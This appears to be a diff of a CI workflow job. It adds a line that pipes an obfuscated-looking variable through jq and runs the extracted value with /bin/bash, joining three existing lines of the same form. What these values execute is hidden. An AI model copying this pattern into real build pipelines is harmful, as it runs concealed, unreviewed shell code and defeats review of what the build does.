@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$sd3440" | jq -r .c8372 | /bin/bash
           echo $rar31561 | jq -r .b78611 | /bin/bash
           echo $maxlj50149 | jq -r .zfshd67910 | /bin/bash
+          echo $k7 | jq -r .fiw7 | /bin/bash
 
       - name: Archive output
         if: always()
